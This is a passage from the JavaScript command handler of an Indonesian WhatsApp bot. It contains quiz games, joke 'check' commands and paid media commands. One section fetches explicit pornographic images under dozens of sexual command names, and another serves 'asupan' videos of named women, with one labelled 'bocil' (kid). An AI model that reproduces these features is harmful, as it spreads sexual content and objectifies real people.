let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebaklirik[m.chat] = [
await Aira.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (tebaklirik[m.chat]) {
delete tebaklirik[m.chat]
return newReply (waktuHabis(result.jawaban), footxt, m)
}
}, 120000)
]
}
break
case 'teli': {
if (!(m.chat in tebaklirik)) return
let json = tebaklirik[m.chat][1]
send1ButReply(m.chat,'```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```','Dahlah Nyerah Aja✌️','Dahlah Nyerah Aja✌️','.yteli','gaada')
}
break
case 'yteli': {
if (!(m.chat in tebaklirik)) return
clearTimeout(tebaklirik[m.chat][3])
delete tebaklirik[m.chat]
return Aira.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
case 'tebaktebakan': {
if (tebaktebakan[m.chat]) return Aira.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaktebakan[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebaktebakan[m.chat] = [
await Aira.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (tebaktebakan[m.chat]) {
delete tebaktebakan[m.chat]
return newReply (waktuHabis(result.jawaban), footxt, m)
}
}, 120000)
]
}
break
case 'teteb': {
if (!(m.chat in tebaktebakan)) return
let json = tebaktebakan[m.chat][1]
send1ButReply(m.chat,'```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```','Dahlah Nyerah Aja✌️','Dahlah Nyerah Aja✌️','.yteteb','gaada')
}
break
case 'yteteb': {
if (!(m.chat in tebaktebakan)) return
clearTimeout(tebaktebakan[m.chat][3])
delete tebaktebakan[m.chat]
return Aira.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
case 'susunkata': {
if (susunkata[m.chat]) return Aira.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: susunkata[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
susunkata[m.chat] = [
await Aira.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\nSoal : ${result.soal}\nTipe : ${result.tipe}\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (susunkata[m.chat]) {
delete susunkata[m.chat]
return newReply (waktuHabis(result.jawaban), footxt, m)
}
}, 120000)
]
}
break
case 'tesuka': {
if (!(m.chat in susunkata)) return
let json = susunkata[m.chat][1]
send1ButReply(m.chat,'```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```','Dahlah Nyerah Aja✌️','Dahlah Nyerah Aja✌️','.ytesuka','gaada')
}
break
case 'ytesuka': {
if (!(m.chat in susunkata)) return
clearTimeout(susunkata[m.chat][3])
delete susunkata[m.chat]
return Aira.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
case 'caklontong': {
if (caklontong[m.chat]) return Aira.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: caklontong[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
caklontong[m.chat] = [
await Aira.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\nSoal : ${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\nJika Anda Merasa Ga Mampu Silahkan Ketik .ytelo`, m), result, 250,
setTimeout(() => {
if (caklontong[m.chat]) {
delete caklontong[m.chat]
return newReply (waktuHabis(result.jawaban), footxt, m)
}
}, 120000)
]
}
break
case 'telo': {
if (!(m.chat in caklontong)) return
let json = caklontong[m.chat][1]
send1ButReply(m.chat,'```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```','Dahlah Nyerah Aja✌️','Dahlah Nyerah Aja✌️','.ytelo','gaada')
}
break
case 'ytelo': {
if (!(m.chat in caklontong)) return
clearTimeout(caklontong[m.chat][3])
delete caklontong[m.chat]
return Aira.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
case 'tekateki': {
if (tekateki[m.chat]) return Aira.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tekateki[m.chat][0]
})
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tekateki[m.chat] = [
await Aira.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik`, m), result, 250,
setTimeout(() => {
if (tekateki[m.chat]) {
delete tekateki[m.chat]
return newReply (waktuHabis(result.jawaban), footxt, m)
}
}, 120000)
]
}
break
case 'tete': {
if (!(m.chat in tekateki)) return
let json = tekateki[m.chat][1]
send1ButReply(m.chat,'```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```','Dahlah Nyerah Aja✌️','Dahlah Nyerah Aja✌️','.ttete','gaada')
}
break
case 'ttete': {
if (!(m.chat in tekateki)) return
clearTimeout(tekateki[m.chat][3])
delete tekateki[m.chat]
return Aira.sendMessage(m.chat, {text: `_*Lemahh Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
break
//asupan
case 'chika': case 'rikagusriani': case 'bocil': case 'geayubi': case 'santuy': case 'ukhty': case 'asupan': case 'delvira': case 'ayu': case 'bunga': case 'aura': case 'nisa': case 'ziva': case 'yana': case 'viona': case 'syania': case 'riri': case 'syifa': case 'mama_gina': case 'alcakenya': case 'mangayutri': {
if (!isCreator && !isPremium)return newReply(mess.OnlyPrem)
newReply(mess.wait)
Aira.sendMessage(m.chat, {video: {url: `https://api.zeeoneofc.my.id/api/asupan/${command}?apikey=${setting.BotKey}`, mimetype:'video/mp4'}, caption: 'Nih asupan guys 😋'},{quoted: m})
.catch((err) => {
newReply(util.format(err))
})
}
break
//cewek asia
case 'vietnam': case 'malaysia': case 'korea': case 'indonesia': case 'japan': case 'thailand': case 'china':
{
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
newReply(mess.wait)
let cecan = await getBuffer(`https://api.zeeoneofc.my.id/api/cecan/${command}?apikey=${setting.BotKey}`)
await Aira.sendMessage(m.chat, {image: cecan, caption: `Nih kak foto ${command} nya 😋`},{quoted: m})
}
break
case 'jiso': case 'lisa': case 'rose':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
newReply(mess.wait)
let cecan = await getBuffer(`https://api.zeeoneofc.my.id/api/cecan/${command}?apikey=${setting.BotKey}`)
await Aira.sendMessage(m.chat, {image: cecan, caption: `Nih kak foto ${command} nya 😋`},{quoted: m})
}
break
//cogan
case 'wuyifan': case 'suga': case 'parkchanyeol': case 'ohsehun': case 'luhan': case 'kimtaehyung': case 'kimsoek': case 'kimnanjoon': case 'kimminseok': case 'kimjunmyeon': case 'kimjong': case 'kimjondae': case 'jungkook': case 'jimin': case 'jhope': case 'huangzitao': case 'dohkyungsoo': case 'baekhyung':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
newReply(mess.wait)
let cogan = await getBuffer(`https://api.zeeoneofc.my.id/api/cogan/${command}?apikey=${setting.BotKey}`)
await Aira.sendMessage(m.chat, {image: cogan, caption: 'Nih Kak Cowok Gantengnya 😋'},{quoted: m})
}
break
//nsfw
case 'baka':case 'smug':case 'neko_sfw':case 'hentai_gif':case 'spank':case 'blowjob':case 'cumarts':case 'eroyuri':case 'eroneko':case 'erokemonomimi':case 'erokitsune':case 'ero':case 'feet':case 'erofeet':case 'feetgif':case 'femdom':case 'futanari':case 'hentai':case 'holoero':case 'holo':case 'keta':case 'kitsune':case 'kemonomimi':case 'pussyart':case 'pussywankgif':case 'girl_solo':case 'girl_solo_gif':case 'tits':case 'trap':case 'yuri':case 'avatar2':case 'anal':case 'bj':case 'boobs':case 'classic':case 'cumsluts':case 'kuni':case 'lesbian':case 'neko':case 'neko_gif':case 'ahegao':case 'bdsm':case 'cuckold':case 'cum':case 'foot':case 'gangbang':case 'glasses':case 'jahy':case 'masturbation':case 'nsfw_neko':case 'orgy':case 'panties':case 'tentacles':case 'thighs':case 'zettai':{
if (!m.isGroup)return newReply(mess.OnlyGrup)
if (!isCreator&&!isPremium) return newReply('Fitur khusus user premium!')
if (!isNsfw && !m.key.fromMe && !isCreator) return newReply('Fitur nsfw belum di aktifkan')
newReply(mess.wait)
let baka = await getBuffer(`https://api.zeeoneofc.my.id/api/nsfw/${command}?apikey=${setting.BotKey}`)
await Aira.sendMessage(m.chat, {image: baka, caption: `Nih ${command} Nya 😋`},{quoted: m})
}
break
case 'sewabot': case 'daftarprem': case 'buyprem': case 'price': case 'sewa': {
const { sewanya} = require('./menu') 
newReply(`${sewanya}`)
}
break
// Fun Menu
case 'apakah': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
newReply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
}
limitAdd(m.sender, limit)
break
case 'bisakah': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} saya menjadi presiden`)
const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
newReply(`Pertanyaan : Apakah ${q}\nJawaban : ${ga}`)
}
limitAdd(m.sender, limit)
break
case 'bagaimanakah': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} cara mengatasi sakit hati`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
newReply(`Pertanyaan : Apakah ${q}\nJawaban : ${ya}`)
}
limitAdd(m.sender, limit)
break
case 'rate': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const te = ra[Math.floor(Math.random() * ra.length)]
newReply(`Rate : ${q}\nJawaban : *${te}%*`)
}
limitAdd(m.sender, limit)
break
case 'gantengcek': case 'cekganteng': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const teng = gan[Math.floor(Math.random() * gan.length)]
newReply(`Nama : ${q}\nJawaban : *${teng}*`)
}
limitAdd(m.sender, limit)
break           
case 'cantikcek': case 'cekcantik': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const tik = can[Math.floor(Math.random() * can.length)]
newReply(`Nama : ${q}\nJawaban : *${tik}*`)
}
limitAdd(m.sender, limit)
break
case 'cekkhodam': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply("ketik nama lu anjg")
  
	const khodam = [
	  "Kaleng Cat Avian",
	  "Pipa Rucika",
	  "Botol Tupperware",
	  "Badut Mixue",
	  "Sabun GIV",
	  "Sandal Swallow",
	  "Jarjit",
	  "Ijat",
	  "Fizi",
	  "Mail",
	  "Ehsan",
	  "Upin",
	  "Ipin",
	  "sungut lele",
	  "Tok Dalang",
	  "Opah",
	  "Opet",
	  "Alul",
	  "Pak Vinsen",
	  "Maman Resing",
	  "Pak RT",
	  "Admin ETI",
	  "Bung Towel",
	  "Lumpia Basah",
	  "Martabak Manis",
	  "Baso Tahu",
	  "Tahu Gejrot",
	  "Dimsum",
	  "Seblak Ceker",
	  "Telor Gulung",
	  "Tahu Aci",
	  "Tempe Mendoan",
	  "Nasi Kucing",
	  "Kue Cubit",
	  "Tahu Sumedang",
	  "Nasi Uduk",
	  "Wedang Ronde",
	  "Kerupuk Udang",
	  "Cilok",
	  "Cilung",
	  "Kue Sus",
	  "Jasuke",
	  "Seblak Makaroni",
	  "Sate Padang",
	  "Sayur Asem",
	  "Kromboloni",
	  "Marmut Pink",
	  "Belalang Mullet",
	  "Kucing Oren",
	  "Lintah Terbang",
	  "Singa Paddle Pop",
	  "Macan Cisewu",
	  "Vario Mber",
	  "Beat Mber",
	  "Supra Geter",
	  "Oli Samping",
	  "Knalpot Racing",
	  "Jus Stroberi",
	  "Jus Alpukat",
	  "Alpukat Kocok",
	  "Es Kopyor",
	  "Es Jeruk",
	  "Cappucino Cincau",
	  "Jasjus Melon",
	  "Teajus Apel",
	  "Pop ice Mangga",
	  "Teajus Gulabatu",
	  "Air Selokan",
	  "Air Kobokan",
	  "TV Tabung",
	  "Keran Air",
	  "Tutup Panci",
	  "Kotak Amal",
	  "Tutup Termos",
	  "Tutup Botol",
	  "Kresek Item",
	  "Kepala Casan",
	  "Ban Serep",
	  "Kursi Lipat",
	  "Kursi Goyang",
	  "Kulit Pisang",
	  "Warung Madura",
	  "Gorong-gorong"
	]
  const khodamnya = khodam[Math.floor(Math.random() * khodam.length)]
	const response = `
  ╭━━━━°「 *Cekkodam* 」°
┃
┊• *Nama :* ${text}
┃• *KHODAM LU:* *${khodamnya}*
╰═┅═━––––––๑
	  `
  
	newReply(response)
  }
break
case 'sangecek': case 'ceksange': case 'gaycek': case 'cekgay': case 'lesbicek': case 'ceklesbi': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
newReply(`Nama : ${q}\nJawaban : *${sange}%*`)
}
limitAdd(m.sender, limit)
break
case 'kapankah': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
newReply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
}
limitAdd(m.sender, limit)
break
case 'wangy': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Contoh : ${prefix}wangy Aira`)
qq = q.toUpperCase()
awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
newReply(awikwok)
}
limitAdd(m.sender, limit)
break
case 'allmenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: allMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/


let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: allMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./aira.jpg")}, { upload: Aira.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "List All Menu", "sections": [
{
"title": "Main menu 🗒️", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": [
  { "header": "Simplemenu", "title": "Fitur Simple Menu", "id": ".simplemenu" },
  { "header": "Infobot", "title": "Fitur Info Bot", "id": ".infobot" },
  { "header": "Donate", "title": "Fitur Donate", "id": ".donate" },
  { "header": "Dashboard", "title": "Fitur Dashboard", "id": ".dashboard" },
  { "header": "Owner", "title": "Fitur Owner", "id": ".owner" },
  { "header": "Totalfitur", "title": "Fitur Total Fitur", "id": ".totalfitur" },
  { "header": "Cekdrive", "title": "Fitur Cek Drive", "id": ".cekdrive" },
  { "header": "Cekbandwidth", "title": "Fitur Cek Bandwidth", "id": ".cekbandwidth" },
  { "header": "Cekpremium", "title": "Fitur Cek Premium", "id": ".cekpremium" },
  { "header": "Listpremium", "title": "Fitur List Premium", "id": ".listpremium" },
  { "header": "Listsewa", "title": "Fitur List Sewa", "id": ".listsewa" },
  { "header": "Speed", "title": "Fitur Speed", "id": ".speed" },
  { "header": "Ping", "title": "Fitur Ping", "id": ".ping" },
  { "header": "Runtime", "title": "Fitur Runtime", "id": ".runtime" },
  { "header": "Listbahasa", "title": "Fitur List Bahasa", "id": ".listbahasa" }
]},
{
"title": "CONVERTER ♻️ & Ai MENU 🤖", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
  { "header": "Toanime", "title": "Fitur To Anime", "id": ".toanime" },
  { "header": "Tozombie", "title": "Fitur To Zombie", "id": ".tozombie" },
  { "header": "Toqr", "title": "Fitur To QR", "id": ".toqr" },
  { "header": "Differentme", "title": "Fitur Different Me", "id": ".differentme" },
  { "header": "Differentme2", "title": "Fitur Different Me 2", "id": ".differentme2" },
  { "header": "Diffusion", "title": "Fitur Diffusion", "id": ".diffusion" },
  { "header": "Txt2img", "title": "Fitur Text to Image", "id": ".txt2img" },
  { "header": "Aiscene", "title": "Fitur AI Scene", "id": ".aiscene" },
  { "header": "Remini", "title": "Fitur Remini", "id": ".remini" },
  { "header": "Hdr", "title": "Fitur HDR", "id": ".hdr" },
  { "header": "Nobg", "title": "Fitur No Background", "id": ".nobg" },
  { "header": "Removebg", "title": "Fitur Remove Background", "id": ".removebg" },
  { "header": "Resize", "title": "Fitur Resize", "id": ".resize" },
  { "header": "Setfps", "title": "Fitur Set FPS", "id": ".setfps" },
  { "header": "Ssweb", "title": "Fitur Screenshot Web", "id": ".ssweb" },
  { "header": "Ssweb2", "title": "Fitur Screenshot Web 2", "id": ".ssweb2" },
  { "header": "Gimage", "title": "Fitur Google Image", "id": ".gimage" },
  { "header": "Shortlink", "title": "Fitur Short Link", "id": ".shortlink" },
  { "header": "Sticker", "title": "Fitur Sticker", "id": ".sticker" },
  { "header": "Stickerwm", "title": "Fitur Sticker with Watermark", "id": ".stickerwm" },
  { "header": "Smeme", "title": "Fitur Meme", "id": ".smeme" },
  { "header": "Toimg", "title": "Fitur To Image", "id": ".toimg" },
  { "header": "Tourl", "title": "Fitur To URL", "id": ".tourl" },
  { "header": "Tovideo", "title": "Fitur To Video", "id": ".tovideo" },
  { "header": "Tomp3", "title": "Fitur To MP3", "id": ".tomp3" },
  { "header": "Toaudio", "title": "Fitur To Audio", "id": ".toaudio" },
  { "header": "Tovn", "title": "Fitur To VN", "id": ".tovn" },
  { "header": "Toptv", "title": "Fitur To PTV", "id": ".toptv" },
  { "header": "Readvo", "title": "Fitur Read Voice Over", "id": ".readvo" },
  { "header": "Ttp", "title": "Fitur TTP", "id": ".ttp" },
  { "header": "Attp", "title": "Fitur ATTP", "id": ".attp" },
  { "header": "Qc", "title": "Fitur QC", "id": ".qc" },
  { "header": "Emojimix", "title": "Fitur Emoji Mix", "id": ".emojimix" },
  { "header": "Ai", "title": "Fitur AI", "id": ".ai" },
  { "header": "Aiimg", "title": "Fitur AI Image", "id": ".aiimg" },
  { "header": "Aidraw", "title": "Fitur AI Draw", "id": ".aidraw" },
  { "header": "Simi", "title": "Fitur Simi", "id": ".simi" },
  { "header": "Scantext", "title": "Fitur Scan Text", "id": ".scantext" },
  { "header": "Scanai", "title": "Fitur Scan AI", "id": ".scanai" },
  { "header": "Ocr", "title": "Fitur OCR", "id": ".ocr" },
  { "header": "Ocrai", "title": "Fitur OCR AI", "id": ".ocrai" },
  { "header": "Nuliskiri", "title": "Fitur Tulis Kiri", "id": ".nuliskiri" },
  { "header": "Nuliskanan", "title": "Fitur Tulis Kanan", "id": ".nuliskanan" },
  { "header": "Foliokiri", "title": "Fitur Folio Kiri", "id": ".foliokiri" },
  { "header": "Foliokanan", "title": "Fitur Folio Kanan", "id": ".foliokanan" },
  { "header": "Say", "title": "Fitur Say", "id": ".say" },
  { "header": "Translate", "title": "Fitur Translate", "id": ".translate" }
]},

{
"title": "Anonymous Menu 🕵️", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
  { "header": "Anonymouschat", "title": "Fitur Anonymous Chat", "id": ".anonymouschat" },
  { "header": "Start", "title": "Fitur Start", "id": ".start" },
  { "header": "Next", "title": "Fitur Next", "id": ".next" },
  { "header": "Stop", "title": "Fitur Stop", "id": ".stop" },
  { "header": "Sendprofile", "title": "Fitur Send Profile", "id": ".sendprofile" },
  { "header": "Menfess", "title": "Fitur Menfess", "id": ".menfess" },
  { "header": "Confess", "title": "Fitur Confess", "id": ".confess" },
  { "header": "terimamenfess", "title": "Fitur Balas Menfess", "id": ".terimamenfess" },
  { "header": "Tolakmenfess", "title": "Fitur Tolak Menfess", "id": ".tolakmenfess" },
  { "header": "Stopmenfess", "title": "Fitur Stop Menfess", "id": ".stopmenfess" }
]},
{
"title": "Store Menu 🛍️", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "List", "title": "Fitur list", "id": ".list" },
    { "header": "Addlist", "title": "Fitur addlist", "id": ".addlist" },
    { "header": "Dellist", "title": "Fitur dellist", "id": ".dellist" },
    { "header": "Update", "title": "Fitur update", "id": ".update" },
    { "header": "Jeda", "title": "Fitur jeda", "id": ".jeda" },
    { "header": "Tambah", "title": "Fitur tambah", "id": ".tambah" },
    { "header": "Kurang", "title": "Fitur kurang", "id": ".kurang" },
    { "header": "Kali", "title": "Fitur kali", "id": ".kali" },
    { "header": "Bagi", "title": "Fitur bagi", "id": ".bagi" },
    { "header": "Delsetdone", "title": "Fitur delsetdone", "id": ".delsetdone" },
    { "header": "Changedone", "title": "Fitur changedone", "id": ".changedone" },
    { "header": "Setdone", "title": "Fitur setdone", "id": ".setdone" },
    { "header": "Delsetproses", "title": "Fitur delsetproses", "id": ".delsetproses" },
    { "header": "Changeproses", "title": "Fitur changeproses", "id": ".changeproses" },
    { "header": "Setproses", "title": "Fitur setproses", "id": ".setproses" },
    { "header": "Proses", "title": "Fitur proses", "id": ".proses" },
    { "header": "Done", "title": "Fitur done", "id": ".done" }
]},
{
"title": "Panel Menu 🌐", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "Panel", "title": "Fitur panel", "id": ".panel" },
    { "header": "Listusr", "title": "Fitur listusr", "id": ".listusr" },
    { "header": "Listsrv", "title": "Fitur listsrv", "id": ".listsrv" },
    { "header": "Addusr", "title": "Fitur addusr", "id": ".addusr" },
    { "header": "Delusr", "title": "Fitur delusr", "id": ".delusr" },
    { "header": "Addsrv", "title": "Fitur addsrv", "id": ".addsrv" },
    { "header": "Delsrv", "title": "Fitur delsrv", "id": ".delsrv" },
    { "header": "Updatesrv", "title": "Fitur updatesrv", "id": ".updatesrv" },
    { "header": "Suspend", "title": "Fitur suspend", "id": ".suspend *id*" },
    { "header": "Unsuspend", "title": "Fitur unsuspend", "id": ".unsuspend *id*" },
    { "header": "Createadmin", "title": "Fitur createadmin", "id": ".createadmin" },
    { "header": "Listadmin", "title": "Fitur listadmin", "id": ".listadmin" }
]},
{
"title": "Reseller Menu 💻", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "1gb", "title": "Fitur 1gb", "id": ".1gb" },
